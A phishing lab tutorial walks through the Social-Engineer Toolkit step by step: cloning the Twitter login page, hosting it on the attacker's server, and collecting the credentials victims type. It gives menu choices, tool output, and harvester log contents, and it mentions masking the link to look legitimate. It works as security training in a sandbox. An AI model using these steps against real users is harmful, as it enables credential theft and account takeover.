In the previous lessons you learned about what phishing is. This lesson will use a tool called setoolkit to create a fake cloned website and harvest their credentials.  

Normally, the first thing we will do is to start the setoolkit program, which you can do  by typing './setoolkit' within the 'set' folder, in a hacker distro. But we have already done this for you.  

You should see a list of different options that you can select from.  

Since we are going to be tricking the user into giving secretive information. We are going to be executing a `Social Engineering Attack`. Select option number `1`{{execute}}.  

Because we will be creating a fake cloned website, we will choose the `Website Attack Vectors` option by selecting option number  `2`{{execute}}.    

Using that fake cloned website, we will be attempting to steal the victims username and password (or credentials). So we will choose the `Credential Harvesting` attack type, which is option number `3`{{execute}}.  

We will be creating a site that looks and seems exactly like another website. Select the `Site Cloner` choice number `2`{{execute}}.  

__IP Address__
The IP address also known as the internet protocol address is a unique series of numbers that shows your device is either a host network or connected to a host network so you can browse and search the internet. Our computer is provided this IP address by the router and internet network we are connected to.  

The reason why we need to type in our IP address in setoolkit is because when the user types in their credentials and the username and password have been stolen the faked cloned website needs to send the credentials back to our computer. The only way to do that is by using our unique internet protocol identifier (IP address). Also our IP address will be hosting the cloned website so that is what the user will be connecting to.  

The IP address we will be using the IP address of the webserver where the setoolkit is running. DON'T use localhost:8099 which we would use if we were testing it locally.  

In our case, since the instance is running within our learning environment, we will use the URL and specify that as the IP address. This includes the domain, port, host and environment information. To find out this URL, click on the Tab will says 'Hacker Website' and it will open a page in your local browser. This URL is `[[HOST_SUBDOMAIN]]-8099-[[KATACODA_HOST]].environments.katacoda.com`{{copy}}  
Copy (<kbd>Ctrl</kbd>+<kbd>C</kbd>) this URL shown above and paste (<kbd>Ctrl</kbd>+<kbd>V</kbd>) it into the setoolkit window where it asks for IP Address.
Press <kbd>enter</kbd> or <kbd>return</kbd> to continue.  

Now you should be prompted with a text that talks about the website we will be cloning. Type in `https://twitter.com/login?lang=en`{{execute}} This is the website we will be cloning.  

You will see a message like `[*] Cloning the website: https://twitter.com/login?lang=en
[*] This could take a little bit...

The best way to use this attack is if username and password form
fields are available. Regardless, this captures all POSTs on a website.
[*] You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.
Press {return} if you understand what we're saying here.`  

Press <kbd>enter</kbd> or <kbd>return</kbd> to continue.  

You will see a message like `[*] Apache is set to ON - everything will be placed in your web root directory of apache.
[*] Files will be written out to the root directory of apache.
[*] ALL files are within your Apache directory since you specified it to ON.
[!] Apache may be not running, do you want SET to start the process? [y/n]:`  

Press `y`{{execute}} to start the `Apache` web server.  

Now you will see something like `Apache webserver is set to ON. Copying over PHP file to the website.
Please note that all output from the harvester will be found under apache_dir/harvester_date.txt
Feel free to customize post.php in the /var/www/html directory
[*] All files have been copied to /var/www/html
[*] SET is now listening for incoming credentials. You can control-c out of this and completely exit SET at anytime and still keep the attack going.
[*] All files are located under the Apache web root directory: /var/www/html
[*] All fields captures will be displayed below.
[Credential Harvester is now listening below...]`  

Leave the credential harvester running for now. We will come back to this later.  

Now, let us pretend that you sent a phishing email to a target telling them to check out a cool new post/tweet and you gave them the fake link. You can go even to the extent of masking the IP or the link so that the link looks legitimate; like it is from twitter.com (For time purposes, we won't do this). Normally most people would click on it, especially if they trust you.  

Now think of yourself as the one receiving the phishing email and you clicked on the link. To simulate this, click on the tab that reads `Hacker Website` (this will be the phishing website that a real user would get redirected to when they click on the phishing link). It will open up the page and show the cloned (fake) website. You should see a website that looks likes the exact same as the real website at http://twitter.com/login?lang=en.  

Type in a `username` and `password`. It can be anything. It is advisable that for this learning purposes, you do not use your real twitter account username and/or password. Click on the button that says `Login`.  

On the terminal window you should see the username and password that you typed in the browser displayed as shown below:  
`('Array\n',)
('(\n',)
('    [session] => Array\n',)
('        (\n',)
('            [username_or_email] => klms_student\n',)
('            [password] => klmsR0x\n',)
('        )\n',)
('\n',)
`  
This same information is also logged inside a log file in the `/var/www/html` directory. That file is named with the timestamp when the log entry was made.  

Go back to the `Terminal` window where the Credential harvester is running.  

Press <kbd>Ctrl</kbd>+<kbd>C</kbd> `Ctrl-C`{{execute interrupt}} on the terminal window to close the setoolkit program. You will get a notice though you are exiting the program, the social engineering credential harvester request is still running and logging as shown below. `[*] Exiting the menu - note that everything is still running and logging under your web directory path: /var/www/html
{Press return to continue}`  

Press the enter key or return {{execute}} to continue.  
Then type `exit`{{execute}} in the prompt `set:webattack>` to get out of the setoolkit tool.  

In the command prompt, type `cd /var/www/html`{{execute}} to navigate to directory where the log files are.  

Now go back to the `Terminal` window. Type `ls -la`{{execute}} and see that there is a harvester file with a new timestamp. E.g., `harvester_2020-01-11 21:39:55.714597.txt` The credentials we hacked will be in this file. You can read the contents of this file using the `cat` command. `cat` the harvester file with the latest timestamp. Once you `cat` that file, you should see something like with the credentials that got hacked in it.
`(
    [username_or_email] => klms_student
    [password] => klmsR0x
)`  

You have learned how to successfully social engineer and hack someone!  
